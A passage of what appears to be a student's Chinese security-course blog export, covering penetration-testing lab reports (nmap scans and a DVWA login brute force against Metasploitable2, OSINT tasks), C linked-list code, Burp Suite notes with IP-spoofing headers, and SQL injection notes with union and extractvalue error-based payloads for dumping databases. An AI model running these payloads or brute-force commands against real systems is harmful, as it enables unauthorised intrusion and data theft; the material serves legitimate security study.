（4）密码的破解方面，让我们了解了使用弱口令很容易就被破解，破解密码的方式和工具也有很多种，熟悉了对zip文件的密码的破解，同时也熟悉了brupsuite的使用，利用brupsuite实现了对网站登录密码的暴力破解，更加理解了浏览器的原理，以及brupsuite的使用。","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"实验一 网络扫描与网络侦察","slug":"实验一 网络扫描与网络侦察","date":"2023-12-10T13:57:39.142Z","updated":"2023-12-23T14:49:39.585Z","comments":true,"path":"2023/12/10/实验一 网络扫描与网络侦察/","permalink":"http://example.com/2023/12/10/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/","excerpt":"","text":"实验一 网络扫描与网络侦察1. 实验目的和要求实验目的：理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。 系统环境：Kali Linux 2、Windows 网络环境：交换网络结构 实验工具： Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali）；WinHex、数据恢复软件等 2.实验原理：1、网络扫描与网络侦察的目的黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； （4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。 2、Google Hacking（或baidu）Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。 3、BASE64编码BASE64是一种编码方式，通常用于把二进制数据编码为可写的字符形式的数据。 编码后的数据是一个字符串，其中包含的字符为：A-Z、a-z、0-9、+、&#x2F;共64个字符。（其实是65个字符，“&#x3D;”是填充字符）。 长度为3个字节(38)的数据经过Base64编码后就变为4个字节(46)。 如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。 字符串“Xue”经过Base64编码后变为“WHVl”。 字符串“Xu”经过Base64编码后变为“WHU&#x3D;”。 字符串“X”经过Base64编码后变为“WA&#x3D;&#x3D;”。 4、NmapNmap是一个网络侦察和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取哪台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP&#x2F;IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口映射)，碎片扫描，以及灵活的目标和端口设定。 Nmap运行通常会得到被扫描主机端口的列表。Nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止Nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙&#x2F;包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。 根据使用的功能选项，Nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。 5、WinHexWinHex 是一款以通用的 16 进制编辑器为核心，专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具： 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等。 3. 实验步骤1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。 2、照片中的女生在哪里旅行？截图搜索到的地址信息。 回答：使用搜索引擎得到地址，再通过谷歌地图找到门店（需要调整时间） 3、手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。 获取自己手机的LAC和CID： Android 获取方法：Android： 拨号*##4636##*进入手机信息工程模式后查看 iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest Serving Cell info–&gt;LAC&#x3D;Tracking Area Code –&gt;cellid &#x3D; Cell identity 若不能获取，用右图信息。 截图你查询到的位置信息。 回答：使用右图信息 4、编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。 回答： 5、地址信息5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。回答：该用户使用的设备为苹果品牌 该IP定位为“广西桂林市桂林电子科技大学” 5.2 访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因回答：不相同，原因： 我们能够上网靠的是isp组织分给我们的Ip地址，但是这个ip地址一般不是给个人的，一般都是给一个单位，一个区域的，也就是说我们实际上能接触到的一般都是私有地址，即我们用ipconig查到的都是私有地址，也就相当于局域网内的ip地址，当我们真正联网时，会先把数据发送到路由，然后再由路由进行处理实现真正的联网操作，路由的地址才是真正联网的Ip地址，也就是pubilc ip，而我们在自己电脑上查到的都是私有ip 6、NMAP使用6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能回答:通过NMAP扫描整个子网得到Metasploitable2的ip以及开发端口 其中 a.80端口为web服务 b.3306端口为MySQL数据库服务 C.21端口主要用于FTP（File Transfer Protocol，文件传输协议）服务。 FTP服务主要是为了在两台计算机之间实现文件的上传与下载，一台计算机作为FTP客户端，另一台计算机作为FTP服务器，可以采用匿名（anonymous）登录和授权用户名与密码登录两种方式登录FTP服务器。 d.22端口主要用于SSH(Secure SHell) SSH的英文全称是Secure SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够防止DNS和IP欺骗。还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道” 6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图回答：扫描命令为“nmap -O +目标 IP” Metasploitable2的操作系统为linux 6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码回答：nmap -p80 –script http-form-brute –script-args http-form-brute.path&#x3D;&#x2F;dvwa&#x2F;login.php 192.168.154.142 -d 账号&#x2F;密码admin&#x2F;password 6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。回答：WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播 [1]。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。 [2]勒索病毒是自熊猫烧香以来影响力最大的病毒之一。WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元，已经影响到金融，能源，医疗等众多行业，造成严重的危机管理问题。中国部分Windows操作系统用户遭受感染，校园网用户首当其冲，受害严重，大量实验室数据和毕业设计被锁定加密。部分大型企业的应用系统和数据库文件被加密后，无法正常工作，影响巨大。 7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。回答：1. Apache Struts 目录遍历导致文件上传漏洞 Apache Struts是美国阿帕奇（Apache）软件基金会下属的Jakarta项目中的一个子项目，是一个基于MVC设计的Web应用框架。漏洞源于文件上传逻辑存在缺陷，攻击者可利用上传文件参数启动路径遍历，上传恶意文件，进而导致远程代码执行。 2.Apache ActiveMQ jolokia 远程代码执行漏洞 Apache ActiveMQ 中存在远程代码执行漏洞，具有 Apache ActiveMQ 服务器TCP端口（默认为61616）访问权限的远程攻击者可以通过发送恶意数据到服务器从而执行任意代码。 3.CVE-2019-0211 Apache Root Privilege Escalation 在MPM prefork中，以root身份运行的主服务器进程管理一个单线程、低权限（www-data）的工作进程池，用于处理HTTP请求。为了从工作进程那里获得反馈，Apache维护了一个共享内存区域（SHM）计分板，其中包含各种信息，例如工作进程的PID，以及它们处理的最后一个请求。每个工作进程都以维护与其PID相关联的process_score结构为目标，并且具有对SHM的完全读&#x2F;写访问权限。 8、Winhex简单数据恢复与取证8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。回答：文件类型为jpg文件，但文件头却为00 00 FF E0,jpg文件的文件头应为FF D8 FF E0,修改文件头得到图片 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849一、常见文件头文件尾1、图片JPEG 文件头：FF D8 FF 文件尾：FF D9TGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3BBMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M)TIFF (tif) 文件头：49 49 2A 00ico 文件头：00 00 01 00Adobe Photoshop (psd) 文件头：38 42 50 532、office文件MS Word/Excel (xls.or.doc) 文件头：D0 CF 11 E0MS Access (mdb) 文件头：53 74 61 6E 64 61 72 64 20 4AWordPerfect (wpd) 文件头：FF 57 50 43Adobe Acrobat (pdf) 文件头：25 50 44 46 2D 31 2Eapplication/vnd.visio(vsd) 文件头：D0 CF 11 E0 A1 B1 1A E1Email [thorough only] (eml) 文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3AOutlook Express (dbx) 文件头：CF AD 12 FE C5 FD 74 6FOutlook (pst) 文件头：21 42 44 4ERich Text Format (rtf) 文件头：7B 5C 72 74 66txt 文件(txt) 文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的3、压缩包文件ZIP Archive (zip) 文件头：50 4B 03 04 文件尾：50 4BRAR Archive (rar) 文件头：52 61 72 214、音频文件Wave (wav) 文件头：57 41 56 45audio(Audio) 文件头： 4D 54 68 64audio/x-aac（aac）文件头：FF F1(9)5、视频文件AVI (avi) 文件头：41 56 49 20Real Audio (ram) 文件头：2E 72 61 FDReal Media (rm) 文件头：2E 52 4D 46MPEG (mpg) 文件头：00 00 01 BA(3)Quicktime (mov) 文件头：6D 6F 6F 76Windows Media (asf) 文件头：30 26 B2 75 8E 66 CF 11MIDI (mid) 文件头：4D 54 68 646、代码文件XML (xml) 文件头：3C 3F 78 6D 6CHTML (html) 文件头：68 74 6D 6C 3EQuicken (qdf) 文件头：AC 9E BD 8FWindows Password (pwl) 文件头：E3 82 85 967、其他类型windows证书文件(der) 文件头：30 82 03 C9CAD (dwg) 文件头：41 43 31 30Windows Shortcut (lnk) 文件头：4C 00 00 00Windows reg(reg) 文件头：52 45 47 45 44 49 54 34 8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。回答：隐藏信息为tom is the kille-. 8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。 回答：下载一定的软件即可恢复 9、讨论学校热点GUET-WiFi的安全问题，以截图说明。 10、实验小结实验报告小结需要描述Ethical Hacking的理解。 我对Ethical Hacking的理解：我对道德黑客的理解是指通过授权且合法的方式，以保护和提升网络安全为目标的技术活动。道德黑客是一群具备专业知识和技能的安全专家，他们通过模拟攻击和漏洞测试来评估系统和网络的安全性。他们的主要目的是发现潜在的安全风险，并向组织提供建议和解决方案来增强其安全性。 道德黑客与恶意黑客有着明显的区别，他们严格遵守法律和道德准则，并通过与组织合作的方式来执行其任务。他们的活动是经过授权的，通常在组织的请求下进行，以保护系统免受潜在的攻击和数据泄露。 道德黑客的工作范围包括对网络、应用程序和系统进行漏洞扫描、渗透测试、安全评估等活动。他们利用类似黑客攻击的技术手段来发现漏洞，然后向组织报告这些漏洞以及相应的修复建议。 总而言之，道德黑客的目标是通过帮助组织发现并修复安全漏洞，提高网络和系统的安全性，从而保护用户的数据和隐私。他们在维护网络安全方面发挥着重要的作用。 1.向网络上传个人照片时，若不想暴露个人位置，需要对照片的关键信息打上马赛克。 2.通过LAC码和CID码，可以初步确定手机用户的位置，所以自己手机的LAC和CID码不应该随便让其他人知道。 3.利用一定软件可以进行编码解码。注意：如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。 4.当文件打不开时，可以利用winhex进行修复","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"栈","slug":"栈","date":"2023-12-08T09:41:14.018Z","updated":"2023-12-08T10:56:02.578Z","comments":true,"path":"2023/12/08/栈/","permalink":"http://example.com/2023/12/08/%E6%A0%88/","excerpt":"","text":"类型定义123456struct Node&#123; int data; struct Node *next;&#125;; typedef struct Node * PNode;typedef struct Node * top, * LinkStack; 创建空栈1234567LinkStack SetNullStack_link()&#123; LinkStack top=(LinkStack)malloc(sizeof(struct Node)); if(top!=NULL) top-&gt;next=NULL; else printf(&quot;创建空栈失败\\n&quot;); return top;&#125; 判空12345int IsNullStack_Link(LinkStack top)&#123; if(top-&gt;next==NULL) return 1; return 0;&#125; 进栈1234567891011void Push_link(LinkStack top,int x)&#123; PNode p; p=(PNode)malloc(sizeof(struct Node)); if(p==NULL) printf(&quot;进栈创建失败\\n&quot;); else&#123; p-&gt;data=x; p-&gt;next=top-&gt;next; top-&gt;next=p; &#125;&#125; 取栈顶12345int Top_link(LinkStack top) &#123; if(IsNullStack_Link(top)) printf(&quot;此栈为空\\n&quot;); else return top-&gt;next-&gt;data; &#125; 出栈12345678910void Pop_link(LinkStack top)&#123; PNode p; if(IsNullStack_Link(top)) printf(&quot;此栈为空\\n&quot;); else&#123; p=top-&gt;next; top-&gt;next=p-&gt;next; free(p); &#125;&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"链表","slug":"链表","date":"2023-12-08T07:59:27.246Z","updated":"2023-12-08T08:44:25.250Z","comments":true,"path":"2023/12/08/链表/","permalink":"http://example.com/2023/12/08/%E9%93%BE%E8%A1%A8/","excerpt":"","text":"单链表类型定义1234567typedef int DataType;struct Node&#123; DataType data; //数据域 struct Node* next; //指针域 &#125;;typedef struct Node* PNode; //节点类型定义 typedef struct Node* LinkList; //单链表类型定义 创建链表1234567LinkList SetNullList_Link() &#123; LinkList head = (LinkList)malloc(sizeof(struct Node)); if (head != NULL) head-&gt;next = NULL; else printf(&quot;alloc failure&quot;); return head; &#125; 头插法12345678910111213141516void CreateList_Head(struct Node* head) //用头插法创建单链表 &#123; PNode p=NULL; //临时使用 int data; printf(&quot; 头插法，请输入整形数据建立链表，以 -1 结束\\n&quot;); scanf(&quot;%d&quot;,&amp;data); while(data!=-1) &#123; p=(struct Node*)malloc(sizeof(struct Node)); //分配空间 p -&gt; data=data; //对数据域赋值 p -&gt;next = head -&gt;next; //对next域赋值 head -&gt; next =p; scanf(&quot;%d&quot;,&amp;data); &#125;&#125; 尾插法123456789101112131415161718void CreateList_Tail(struct Node* head) //用尾插法建立链表 &#123; struct Node* p=NULL; struct Node* q=head; int data; printf(&quot;尾插法， 请输入整形数据建立链表，以 -1 结束\\n&quot;); scanf(&quot;%d&quot;,&amp;data); while(data!=-1) &#123; p=(struct Node*)malloc(sizeof(struct Node)); //分配空间 p -&gt; data=data; //数据域赋值 p -&gt;next =NULL; //指针域赋值 q -&gt;next =p; q=p; scanf(&quot;%d&quot;,&amp;data); &#125;&#125; 输出链表123456789void print(LinkList head)&#123; PNode p=head -&gt; next; while(p) &#123; printf(&quot;%d\\n&quot;,p -&gt; data); p=p-&gt;next; &#125; 插入算法1234567891011121314151617181920212223//其中 llist是操作的链表，x是待插入元素y的前驱节点元素，y是待插入的元素int InsertPost_link(LinkList llist,DataType x,DataType y)&#123; PNode p =llist; PNode Newp=(PNode)malloc(sizeof(struct Node)); Newp -&gt; data=y; Newp -&gt; next =NULL; while(p!=NULL)&#123; if (p -&gt; data==x) &#123; Newp -&gt; next=p -&gt; next; p -&gt;next =Newp; return 1; &#125; else&#123; p=p -&gt;next; &#125; &#125; printf(&quot;not exist data %d\\n&quot;,x); return 1;&#125; 删除算法12345678910111213141516171819void DelNode_Link(LinkList head,int deldata)&#123; if(head==NULL)return 1; PNode prees=head; PNode current=head -&gt; next; while(current)&#123; if(current -&gt; data == deldata) &#123; prees -&gt; next = current -&gt; next; free(current); return 1; &#125; else &#123; prees=current; current=current -&gt;next; &#125; &#125; printf(&quot;not exist %d\\n&quot;,deldata);&#125; 循环链表123456789101112131415161718//将尾结点连接到头结点PNode buildCircularLinkedList(int n, PNode tail)&#123; PNode current=NULL, prev; prev = tail; for (int i = 0; i &lt; n; i++) &#123; current = (PNode)malloc(sizeof(Node)); current-&gt;next = NULL; scanf(&quot;%d&quot;, &amp;current-&gt;data); prev-&gt;next = current; prev = current; &#125; current-&gt;next = tail-&gt;next; tail-&gt;next = current; return tail;&#125; 双链表类型定义1234567struct Node&#123; int data; struct Node* pre; struct Node* next;&#125;;typedef struct Node* LinkList;typedef struct Node* PNode; 创建链表12345678LinkList SetList_Link()&#123; LinkList head=(LinkList)malloc(sizeof(struct Node)); head-&gt;data=0; head-&gt;pre=NULL; head-&gt;next=NULL; return head;&#125; 头插法123456789101112void HeadInsert(LinkList head,int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;pre = head; newNode-&gt;next = head-&gt;next; if(head-&gt;next != NULL) &#123; head-&gt;next-&gt;pre = newNode; &#125; head-&gt;next = newNode; &#125; 尾插法12345678910111213void TailInsert(LinkList head, int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = NULL; PNode p = head; while (p-&gt;next != NULL) &#123; p = p-&gt;next; &#125; newNode-&gt;pre = p; p-&gt;next = newNode;&#125; 输出链表12345678910void PrintList(LinkList head)&#123; LinkList PrintList=head-&gt;next; while(PrintList) &#123; printf(&quot;%d-&gt;&quot;,PrintList-&gt;data); PrintList=PrintList-&gt;next; &#125; printf(&quot;NULL\\n&quot;);&#125; 删除12345678910111213void TailInsert(LinkList head, int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = NULL; PNode p = head; while (p-&gt;next != NULL) &#123; p = p-&gt;next; &#125; newNode-&gt;pre = p; p-&gt;next = newNode;&#125; 插入算法1234567891011121314151617181920212223void InsertAfterElement(LinkList head, int target, int data)&#123; PNode p = head-&gt;next; while (p != NULL) &#123; if (p-&gt;data == target) &#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = p-&gt;next; if (p-&gt;next != NULL) &#123; p-&gt;next-&gt;pre = newNode; &#125; newNode-&gt;pre = p; p-&gt;next = newNode; head-&gt;data++; return; &#125; p = p-&gt;next; &#125; printf(&quot;Target element not found\\n&quot;);&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"作业No2","slug":"作业2","date":"2023-12-06T03:17:46.631Z","updated":"2023-12-08T07:03:03.745Z","comments":true,"path":"2023/12/06/作业2/","permalink":"http://example.com/2023/12/06/%E4%BD%9C%E4%B8%9A2/","excerpt":"","text":"题目汇总1.与ZoomEye功能类似的搜索引擎还有哪些？ 2.利用ZoomEye进行相关搜索，截图，发布到自己的Blog。 3.子域名收集，截图。 题目1与ZoomEye功能类似的搜索引擎还有哪些？ 回答： 除了ZoomEye之外，还有一些功能类似的搜索引擎，包括： Shodan：Shodan是一个面向物联网设备的搜索引擎，可以搜索全球范围内连接到互联网的设备，包括路由器、摄像头、服务器等等。用户可以使用Shodan搜索设备，发现漏洞，探查设备安全性等。 BinaryEdge：BinaryEdge是一款面向企业的安全分析工具，提供网络情报、风险评估、漏洞扫描等功能。与ZoomEye类似，BinaryEdge可以搜索Internet上所有的设备和服务，并对其进行评估和分类。 Censys：Censys是一个面向互联网设备和服务的搜索引擎，可以帮助用户发现全球范围内的漏洞和威胁。它可以搜索IPv4和IPv6地址、证书、域名、协议等信息。 Fofa Pro：Fofa Pro是一款面向企业的网络安全搜索引擎，可以搜索包括IP地址、域名、子域名、端口、关键词等信息。它可以帮助用户发现互联网上的资产和漏洞，评估企业的安全风险。 题目2利用ZoomEye进行相关搜索，截图，发布到自己的Blog 回答：搜索 领势 Compact Wireless-G 网络视频摄像机 http服务器 题目3子域名收集，截图。 回答：搜索 百度 的子域名","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"作业No1","slug":"作业1","date":"2023-12-05T05:32:57.310Z","updated":"2023-12-08T07:02:51.086Z","comments":true,"path":"2023/12/05/作业1/","permalink":"http://example.com/2023/12/05/%E4%BD%9C%E4%B8%9A1/","excerpt":"","text":"题目汇总1、Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？2、Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？3、对于1、2的结果，进行总结分析。注：网络配置发生变化，建议重启网卡（操作命令见PPT）作业发布到自己blog备查。 题目1Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？ 回答：不能 题目2Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？ 回答：能 题目3对于1、2的结果，进行总结分析。 回答：Guet-WiFi会给物理机分配ip，不会给虚拟机分配ip","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"burpsuit使用","slug":"burpsuite使用","date":"2023-11-22T05:31:01.277Z","updated":"2023-12-08T11:28:40.816Z","comments":true,"path":"2023/11/22/burpsuite使用/","permalink":"http://example.com/2023/11/22/burpsuite%E4%BD%BF%E7%94%A8/","excerpt":"","text":"更改数据包get请求将请求改为如下 post请求使用POST提交方法和GET类似，将GET改为POST，在末尾添加b&#x3D;2，此时记得添加Content-Type: application&#x2F;x-www-form-urlencoded 伪造IP随便加一行： X-Forwarded-For:127.0.0.1X-Forwarded:127.0.0.1Forwarded-For:127.0.0.1Forwarded:127.0.0.1X-Forwarded-Host:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1Ali-CDN-Real-IP:127.0.0.1Cdn-Src-Ip:127.0.0.1Cdn-Real-Ip:127.0.0.1CF-Connecting-IP:127.0.0.1X-Cluster-Client-IP:127.0.0.1WL-Proxy-Client-IP:127.0.0.1Proxy-Client-IP:127.0.0.1Fastly-Client-Ip:127.0.0.1True-Client-Ip:127.0.0.1 伪造浏览器和设备修改User-Agent 伪造网址修改referer 密码爆破","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SQL注入","slug":"sql注入","date":"2023-11-20T05:58:04.625Z","updated":"2023-12-21T11:18:21.069Z","comments":true,"path":"2023/11/20/sql注入/","permalink":"http://example.com/2023/11/20/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"MySQL操作登陆：1mysql -u [用户名] -p 查询用户名所有数据库：1show databases; 创建数据库：1create database [数据库名]； 删除数据库：1drop database [数据库名] ; 使用数据库：1use [数据库名]; 查询数据库中的表：show tables; 创建表：123456789create table [表名](id int;name varchar(40);) 更改数据表名：1rename table [原数据表名] to [新数据表名] 向数据表中插入数据：1insert into [数据表名] (id ,name,age) values (1,&quot;tom&quot; 19); 向数据表中擦插入新的列：1alter table [数据表名] [列名] [列的数据类型]； 更改数据表中的数据：123update [数据表名] set name=&quot;lisa&quot; where id=1;--修改id=1的行name为lisa 删除数据表中的列：1alter table [数据表名] drop [列名] 删除数据表中的行：123delete from [数据表名] where id=1;--删除id=1的行 查询数据表的包涵数据：123select *from [数据表名] where id in (‘3’)；--在数据表中查询id中包涵‘3’的数据 联合查询：123select country from [数据表名1] union select country from [数据表名2] order country;--查询数据表1和数据表2中不同的country 排序：123select * from users order by age asc;--asc升序，desc降序 注入：数字&#x2F;字符型注入：判断：1id=2-1 查询网站所用数据表列数：123select * from users where id=1 order by x;--x从1开始递增，当返回数据显示发生变化时，x-1为数据表列数 查询网站所用数据数据库123select * from users where id=&#x27;0&#x27; union select 1,2,database(),4;--select 后面的数量要与users列数相同 使用：1select group_concat(schema_name) from information_schema.schemata（查库） 1select group_concat(table_name) from information_schema.tables where table_schema=库名（查表) 1select group_concat(column_name) from information_schema.columns where table_schema=[数据库名] and table_name=[表名]（查列） 1select 列名 from 库名.表名（查数据) 报错注入extractvalue1234567查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME)))) ① 0x7e&#x3D;’’ ② concat(‘a’,‘b’)&#x3D;“ab” ③ version()&#x3D;@@version ④ ‘‘可以换成’#’、’$’等不满足xpath格式的字符 ⑤ 